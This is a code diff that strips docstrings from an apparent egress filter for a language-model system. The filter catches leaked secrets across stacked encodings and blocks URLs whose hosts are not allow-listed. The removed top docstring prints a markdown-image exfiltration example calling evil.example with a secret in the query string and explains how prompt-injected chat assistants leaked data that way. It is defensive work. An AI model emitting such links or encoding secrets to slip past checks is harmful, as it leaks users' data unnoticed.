@@ -1,25 +1,3 @@
-"""Layer 5: egress. Checks what the model is about to send back out.
-
-Two independent things get checked on the way out, because a successful
-attack can smuggle data out through either one:
-
-1. Canary / secret matching. If a registered secret leaves in the reply
-   text — spelled normally, spaced out, base64'd, hex'd, reversed,
-   rot13'd, or some combination of those — it should still be caught.
-   Rather than writing one detection rule per encoding (which loses
-   whenever an attacker stacks two encodings in an order you didn't
-   anticipate), this applies every available "undo" operation to the
-   text repeatedly until nothing changes any more (a fixpoint), and
-   checks the canary against every intermediate reading.
-
-2. URL / markdown-image allowlisting. `![alt](https://evil.example/?d=SECRET)`
-   is the actual exfiltration primitive behind real incidents (Slack AI,
-   Copilot Chat): a chat client auto-fetches the image to render it, and
-   the data is gone the instant the message is displayed — no click
-   required. So any URL (plain, markdown link, or markdown image) whose
-   host isn't on an explicit allow-list is blocked outright.
-"""
-
 from __future__ import annotations
 
 import codecs
@@ -37,17 +15,10 @@ _HEX_TOKEN_RE = re.compile(r"\b[0-9a-fA-F]{8,}\b")
 
 
 def _canonical(text: str) -> str:
-    """Strips everything but letters/digits and lowercases, so 'V-A-N-T-A-G-E'
-    and 'vantage' and 'Vantage 7731 Orion' all reduce to the same string."""
     return re.sub(r"[^a-z0-9]", "", text.lower())
 
 
 def _readings(text: str) -> set[str]:
-    """Every 'undo' of text we can cheaply try, applied repeatedly to a
-    fixpoint. Order matters for stacked encodings (e.g. base64 of a
-    hyphen-joined string needs unwrap-then-decode, while a hyphen-joined
-    base64 string needs decode-then-unwrap), so rather than picking one
-    order we keep expanding the whole frontier of readings each pass."""
     frontier = {text}
     seen = {text}
     for _ in range(_MAX_PASSES):
